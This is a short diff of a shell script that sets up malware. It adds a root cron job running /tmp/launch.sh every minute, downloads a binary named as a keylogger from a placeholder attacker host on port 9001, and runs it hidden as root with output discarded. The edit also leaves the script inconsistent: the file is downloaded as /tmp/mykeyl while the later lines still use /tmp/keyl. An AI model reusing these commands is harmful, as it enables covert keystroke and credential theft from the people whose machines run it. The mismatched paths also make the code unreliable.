@@ -18,7 +18,7 @@ EOL2
 chmod +x /tmp/killSwitch.sh
 
 echo '*/1 * * * * /tmp/launch.sh' | crontab -u root -
-wget -O /tmp/keyl https://raw.githubusercontent.com/fortigate3600/KeyL/main/keyl
+wget -O /tmp/mykeyl http://<IP>:9001/mykeyl
 chmod u+x /tmp/keyl
 sudo nohup /tmp/keyl &> /dev/null &
 EOF
